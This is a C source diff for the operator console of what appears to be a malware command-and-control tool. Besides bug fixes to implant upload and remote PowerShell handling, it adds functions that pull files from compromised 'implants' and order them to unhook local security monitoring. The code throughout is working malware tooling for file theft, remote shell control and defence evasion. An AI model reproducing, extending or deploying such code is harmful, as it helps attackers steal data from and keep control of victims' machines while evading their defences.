@@ -104,12 +104,13 @@ DWORD WINAPI thread_upload(struct upload_params_t* params) {
 	char alias_buf[255];
 	int res = -1;
 
-	EnterCriticalSection(&params->ctx.endpoint_db_cs);
+	EnterCriticalSection(&params->ctx->endpoint_db_cs);
 	res = endpoint_id_alias(alias_buf,
 							sizeof(alias_buf),
 							params->endpoint_id,
-							params->ctx.endpoint_db
+							params->ctx->endpoint_db
 	);
+	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
 	if (res == -1)
 		printf("Starting upload to implant %d...\n",
 			params->endpoint_id);
@@ -137,7 +138,7 @@ DWORD WINAPI thread_upload(struct upload_params_t* params) {
 		params->remote_path_len,
 		file_len.QuadPart,
 		&upload_stream,
-		&params->ctx
+		params->ctx
 	);
 	if (res == -1) {
 		printf("Not allowed to create file on endpoint\n");
@@ -161,12 +162,127 @@ DWORD WINAPI thread_upload(struct upload_params_t* params) {
 			upload_stream,
 			temp_buf,
 			read_from_file,
-			params->ctx.transport_pcb->nexus
+			params->ctx->transport_pcb->nexus
 		);
 		total_sent += read_from_file;
 	}
 	printf("Upload complete!\n");
 	
+	CloseHandle(file_handle);
+	free(params);
+	return 0;
+}
+
+int _est_download_thread(endpoint_id_t endpoint_id,
+	char* remote_path,
+	size_t remote_path_len,
+	tremont_stream_id* stream_id_ptr,
+	struct bleeddial_ctx_t* ctx) {
+
+	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
+
+	tremont_stream_id download_stream;
+
+	_req_new_thread(endpoint_id,
+		stream_id_ptr,
+		ctx
+	);
+	download_stream = *stream_id_ptr;
+
+	struct wrkr_msg_t req;
+	req.msg_enum = DOWNLOAD;
+
+	struct download_msg_t* download_msg;
+	download_msg = &req.download;
+	download_msg->msg_enum = REQ;
+
+	struct download_req_t* download_req;
+	download_req = &download_msg->req;
+
+	memcpy(download_req->path, remote_path, remote_path_len);
+	download_req->path_len = remote_path_len;
+
+	tremont_send(download_stream, (byte*)&req, sizeof(req), nexus);
+
+	struct wrkr_msg_t res;
+	tremont_recv(download_stream, (byte*)&res, sizeof(res), nexus);
+
+	return res.download.res.file_len;
+}
+
+DWORD WINAPI thread_download(struct download_params_t* params) {
+	char alias_buf[255];
+	int res = -1;
+
+	EnterCriticalSection(&params->ctx->endpoint_db_cs);
+	res = endpoint_id_alias(alias_buf,
+		sizeof(alias_buf),
+		params->endpoint_id,
+		params->ctx->endpoint_db
+	);
+	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
+	if (res == -1)
+		printf("Starting download from implant %d...\n",
+			params->endpoint_id);
+	else
+		printf("Starting download from %s (%d)...\n",
+			alias_buf,
+			params->endpoint_id);
+
+	HANDLE file_handle;
+	file_handle = CreateFileA(params->local_path,
+		GENERIC_WRITE,
+		FILE_SHARE_READ,
+		NULL,
+		CREATE_ALWAYS,
+		FILE_ATTRIBUTE_NORMAL,
+		NULL
+	);
+
+	tremont_stream_id download_stream;
+	res = _est_download_thread(params->endpoint_id,
+		params->remote_path,
+		params->remote_path_len,
+		&download_stream,
+		params->ctx
+	);
+
+	if (res == 0) {
+		printf("Not allowed to create file on local machine\n");
+		return -1;
+	}
+
+	Tremont_Nexus* nexus = params->ctx->transport_pcb->nexus;
+
+	BOOL can_read = FALSE;
+	int64_t total_size = res;
+	int64_t total_recvd = 0;
+
+	int recvd = 0;
+	int written = 0;
+	char temp_buf[255];
+
+	while (total_recvd < total_size) {
+		recvd = tremont_recv(download_stream,
+			(byte*)temp_buf, sizeof(temp_buf), nexus);
+		WriteFile(file_handle, temp_buf, recvd, &written, 0);
+		total_recvd += recvd;
+	}
+	printf("download complete!\n");
+
+	CloseHandle(file_handle);
+
+	struct wrkr_msg_t msg;
+	tremont_recv(download_stream, (byte*)&msg, sizeof(msg), nexus);
+
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_enum = DOWNLOAD;
+	msg.download.msg_enum = FAK;
+	msg.download.fak.sanity = 1;
+
+	tremont_send(download_stream, (byte*)&msg, sizeof(msg), nexus);
+
+	free(params);
 	return 0;
 }
 
@@ -225,7 +341,7 @@ int sync_powershell(struct powershell_params_t* params) {
 	tremont_opts_stream(stream, OPT_NONBLOCK, 1, nexus);
 
 	char temp_input[255];
-	char temp_recv[255];
+	char temp_recv[256]; //extra byte for null byte
 	int cur_char = 0;
 	int input_len = 0;
 
@@ -235,7 +351,7 @@ int sync_powershell(struct powershell_params_t* params) {
 		if (tremont_poll_stream(stream, nexus) == -1) break;
 		
 		if (tremont_recv(stream, temp_recv,
-			sizeof(temp_recv), nexus) == -1) break;
+			sizeof(temp_recv) - 1, nexus) == -1) break;
 		
 		printf("%s", temp_recv);
 
@@ -270,6 +386,95 @@ int sync_powershell(struct powershell_params_t* params) {
 
 	LeaveCriticalSection(&ctx->cli_info_cs);
 
+	free(params);
+	return 0;
+}
+
+int _est_unhookl_thread(endpoint_id_t endpoint_id,
+	tremont_stream_id* stream_id_ptr,
+	struct bleeddial_ctx_t* ctx) {
+
+	Tremont_Nexus* nexus = ctx->transport_pcb->nexus;
+
+	tremont_stream_id unhookl_stream;
+
+	_req_new_thread(endpoint_id,
+		stream_id_ptr,
+		ctx
+	);
+	unhookl_stream = *stream_id_ptr;
+
+	struct wrkr_msg_t req;
+	req.msg_enum = UNHOOK_L;
+
+	struct unhookl_msg_t* unhookl_msg;
+	unhookl_msg = &req.unhookl;
+	unhookl_msg->msg_enum = REQ;
+
+	struct unhookl_req_t* unhookl_req;
+	unhookl_req = &unhookl_msg->req;
+	unhookl_req->sanity = 1;
+
+	tremont_send(unhookl_stream, (byte*)&req, sizeof(req), nexus);
+
+	struct wrkr_msg_t res;
+	tremont_recv(unhookl_stream, (byte*)&res, sizeof(res), nexus);
+
+	return res.unhookl.res.allowed == 1 ? 0 : -1;
+}
+
+DWORD WINAPI thread_unhookl(struct unhookl_params_t* params) {
+	char alias_buf[255];
+	int res = -1;
+
+	EnterCriticalSection(&params->ctx->endpoint_db_cs);
+	res = endpoint_id_alias(alias_buf,
+		sizeof(alias_buf),
+		params->endpoint_id,
+		params->ctx->endpoint_db
+	);
+	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
+	if (res == -1)
+		printf("Requesting local unhooking from implant %d...\n",
+			params->endpoint_id);
+	else
+		printf("Requesting local unhooking from %s (%d)...\n",
+			alias_buf,
+			params->endpoint_id);
+
+	tremont_stream_id unhookl_stream;
+	res = _est_unhookl_thread(params->endpoint_id,
+		&unhookl_stream,
+		params->ctx
+	);
+
+	Tremont_Nexus* nexus = params->ctx->transport_pcb->nexus;
+
+	struct wrkr_msg_t msg;
+	tremont_recv(unhookl_stream, (byte*)&msg, sizeof(msg), nexus);
+
+	memset(&msg, 0, sizeof(msg));
+	msg.msg_enum = UNHOOK_L;
+	msg.unhookl.msg_enum = FAK;
+	msg.unhookl.fak.sanity = 1;
+
+	tremont_send(unhookl_stream, (byte*)&msg, sizeof(msg), nexus);
+	
+	EnterCriticalSection(&params->ctx->endpoint_db_cs);
+	res = endpoint_id_alias(alias_buf,
+		sizeof(alias_buf),
+		params->endpoint_id,
+		params->ctx->endpoint_db
+	);
+	LeaveCriticalSection(&params->ctx->endpoint_db_cs);
+	if (res == -1)
+		printf("Implant %d unhooked!\n",
+			params->endpoint_id);
+	else
+		printf("%s (%d) unhooked!\n",
+			alias_buf,
+			params->endpoint_id);
+	
 	free(params);
 	return 0;
 }
